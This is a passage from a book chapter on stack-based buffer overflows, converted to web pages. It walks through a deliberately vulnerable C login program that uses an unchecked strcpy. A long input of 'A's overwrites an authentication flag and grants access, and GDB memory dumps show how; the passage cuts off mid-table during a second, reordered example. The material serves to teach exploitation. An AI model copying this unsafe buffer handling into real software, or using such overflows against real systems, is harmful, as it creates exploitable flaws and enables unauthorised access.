<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x321  Stack-Based Buffer Overflow Vulnerabilities</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part54.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part56.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark45">0x321  Stack-Based Buffer Overflow Vulnerabilities</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The notesearch exploit works by corrupting memory to control execution flow. The auth_overflow.c program demonstrates this concept.</p><p class="s40" style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">auth_overflow.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_341.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int check_authentication(char *password) { int auth_flag = 0;</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 212%;text-align: left;">char password_buffer[16]; strcpy(password_buffer, password);</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(strcmp(password_buffer, &quot;brillig&quot;) == 0) auth_flag = 1;</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0) auth_flag = 1;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">return auth_flag;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { if(argc &lt; 2) {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;Usage: %s &lt;password&gt;\n&quot;, argv[0]); exit(0);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;text-align: left;">if(check_authentication(argv[1])) { printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;   Access Granted.\n&quot;); printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">} else {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">printf(&quot;\nAccess Denied.\n&quot;);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_342.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This example program accepts a password as its only command-line argument and then calls a <span class="s31">check_authentication() </span>function. This function allows two passwords, meant to be representative of multiple authentication</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">methods. If either of these passwords is used, the function returns 1, which grants access. You should be able to figure most of that out just by looking at the source code before compiling it. Use the <span class="s31">-g </span>option when you do compile it, though, since we will be debugging this later.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_343.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c reader@hacking:~/booksrc $ ./auth_overflow</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Usage: ./auth_overflow &lt;password&gt; reader@hacking:~/booksrc $ ./auth_overflow test</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Access Denied.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./auth_overflow brillig</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">Access Granted.</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 15pt;text-indent: 0pt;text-align: center;">reader@hacking:~/booksrc $ ./auth_overflow outgrabe</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">Access Granted.</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-bottom: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: center;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_344.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">So far, everything works as the source code says it should. This is to be expected from something as deterministic as a computer program. But an overflow can lead to unexpected and even contradictory behavior, allowing access without a proper password.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_345.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">Access Granted.</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-bottom: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: center;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_346.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">You may have already figured out what happened, but letâ€™s look at this with a debugger to see the specifics of it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_347.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./auth_overflow</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1   #include &lt;stdio.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">2   #include &lt;stdlib.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">3   #include &lt;string.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">5   int check_authentication(char *password) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">6        int auth_flag = 0;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">7        char password_buffer[16];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">8</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9        <span class="s31">strcpy(password_buffer, password);</span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">10</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">11      if(strcmp(password_buffer, &quot;brillig&quot;) == 0)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">13       if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">14           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">15</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16       <span class="s31">return auth_flag;</span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">17   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">18</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">19   int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">20       if(argc &lt; 2) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048421: file auth_overflow.c, line 9. (gdb) break 16</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x804846f: file auth_overflow.c, line 16. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_348.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The GDB debugger is started with the <span class="s31">-q </span>option to suppress the welcome banner, and breakpoints are set on lines 9 and 16. When the program is run, execution will pause at these breakpoints and give us a chance to examine memory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_349.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, check_authentication (password=0xbffff9af &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow.c:9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">9       strcpy(password_buffer, password); (gdb) x/s password_buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7a0:   &quot;)????o??????)\205\004\b?o??p???????&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) x/x &amp;auth_flag 0xbffff7bc:   0x00000000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) print 0xbffff7bc - 0xbffff7a0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 28</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/16xw password_buffer</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7a0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7f9f729</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7d8</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048529</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7b0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff870</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7d8</p></td><td style="width:146pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7c0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7ff47b0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048510</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7d8</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080484bb</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7d0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff9af</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048510</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff838</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb7eafebc</p></td></tr><tr style="height:14pt"><td style="width:57pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:66pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The first breakpoint is before the <span class="s31">strcpy() </span>happens. By examining the <span class="s31">password_buffer </span>pointer, the debugger shows it is filled with random uninitialized data and is located at <span class="s31">0xbffff7a0 </span>in memory. By examining the address of the <span class="s31">auth_flag </span>variable, we can see both its location at <span class="s31">0xbffff7bc</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">and its value of 0. The <span class="s31">print </span>command can be used to do arithmetic and shows that <span class="s31">auth_flag </span>is 28 bytes past the start of <span class="s31">password_buffer</span>. This relationship can also be seen in a block of memory starting at <span class="s31">password_buffer</span>. The loca- tion of <span class="s31">auth_flag </span>is shown in bold.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_350.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) continue Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 2, check_authentication (password=0xbffff9af &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow.c:16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">16        return auth_flag; (gdb) x/s password_buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7a0:   &#39;A&#39; &lt;repeats 30 times&gt; (gdb) x/x &amp;auth_flag</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7bc:  0x00004141 (gdb) x/16xw password_buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7a0:   0x41414141   0x41414141   0x41414141   0x41414141</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7b0:   0x41414141   0x41414141   0x41414141   <b>0x00004141</b></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">0xbffff7c0:   0xb7ff47b0    0x08048510    0xbffff7d8    0x080484bb 0xbffff7d0:   0xbffff9af    0x08048510    0xbffff838    0xb7eafebc (gdb) x/4cb &amp;auth_flag</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7bc:   65 &#39;A&#39; 65 &#39;A&#39; 0 &#39;\0&#39; 0 &#39;\0&#39; (gdb) x/dw &amp;auth_flag</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7bc:  16705 (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_351.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">Continuing to the next breakpoint found after the <span class="s31">strcpy()</span>, these memory locations are examined again. The <span class="s31">password_buffer </span>overflowed into the <span class="s31">auth_flag</span>, changing its first two bytes to <span class="s31">0x41</span>. The value of <span class="s31">0x00004141 </span>might look backward again, but remember that <span class="s27">x</span>86 has little-endian architecture, so itâ€™s supposed to look that way. If you examine each of these four bytes individually, you can see how the memory is actually laid out. Ultimately, the program will treat this value as an integer, with a value of 16705.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_352.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) continue Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">Access Granted.</p><p class="s31" style="padding-left: 18pt;text-indent: 0pt;text-align: center;">-=-=-=-=-=-=-=-=-=-=-=-=-=-</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program exited with code 034. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_353.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After the overflow, the <span class="s31">check_authentication() </span>function will return 16705 instead of 0. Since the if statement considers any nonzero value to be authen- ticated, the programâ€™s execution flow is controlled into the authenticated section. In this example, the <span class="s31">auth_flag </span>variable is the execution control point, since overwriting this value is the source of the control.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">But this is a very contrived example that depends on memory layout of the variables. In auth_overflow2.c, the variables are declared in reverse order. (Changes to auth_overflow.c are shown in bold.)</p><p class="s40" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">auth_overflow2.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_354.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int check_authentication(char *password) {</p><p class="s46" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">char password_buffer[16]; int auth_flag = 0;</p><p class="s31" style="padding-top: 1pt;padding-left: 104pt;text-indent: 0pt;line-height: 21pt;text-align: left;">strcpy(password_buffer, password); if(strcmp(password_buffer, &quot;brillig&quot;) == 0)</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 8pt;text-align: left;">auth_flag = 1;</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;text-align: left;">if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0) auth_flag = 1;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">return auth_flag;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { if(argc &lt; 2) {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">printf(&quot;Usage: %s &lt;password&gt;\n&quot;, argv[0]); exit(0);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(check_authentication(argv[1])) { printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;   Access Granted.\n&quot;); printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">} else {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">printf(&quot;\nAccess Denied.\n&quot;);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_355.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This simple change puts the <span class="s31">auth_flag </span>variable before the <span class="s31">password_buffer </span>in memory. This eliminates the use of the <span class="s31">return_value </span>variable as an execu- tion control point, since it can no longer be corrupted by an overflow.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_356.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g auth_overflow2.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1   #include &lt;stdio.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">2   #include &lt;stdlib.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">3   #include &lt;string.h&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">5   int check_authentication(char *password) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">6        char password_buffer[16];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">7        int auth_flag = 0;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9       strcpy(password_buffer, password);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">10</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">11      if(strcmp(password_buffer, &quot;brillig&quot;) == 0)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">13       if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">14           auth_flag = 1;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">15</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">16       return auth_flag;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">17   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">18</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">19   int main(int argc, char *argv[]) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">20       if(argc &lt; 2) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break 9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048421: file auth_overflow2.c, line 9. (gdb) break 16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x804846f: file auth_overflow2.c, line 16. (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, check_authentication (password=0xbffff9b7 &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow2.c:9</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">9       strcpy(password_buffer, password); (gdb) x/s password_buffer</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7c0:   &quot;?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\ bH???????\002&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">(gdb) x/x &amp;auth_flag 0xbffff7bc:   0x00000000 (gdb) x/16xw &amp;auth_flag</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7bc:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff880</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e8</p></td></tr><tr style="height:11pt"><td style="width:57pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7cc:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: 